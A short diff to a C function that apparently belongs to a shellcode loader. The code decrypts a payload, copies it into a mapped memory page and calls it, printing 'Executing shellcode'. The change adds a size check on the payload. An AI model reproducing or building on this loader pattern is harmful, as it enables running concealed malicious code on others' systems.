@@ -124,6 +124,9 @@ decrypt( char *payload, char *dec_key )
     if ( page == MAP_FAILED )
         fatal(NULL);
 
+    if ( len_payload > 0x1000 )
+        fatal(NULL); // WTF SHELLCODE!?
+
     memcpy( page, payload, len_payload);
     printf("[*] Executing shellcode\n");
     ((void(*)()) page)();
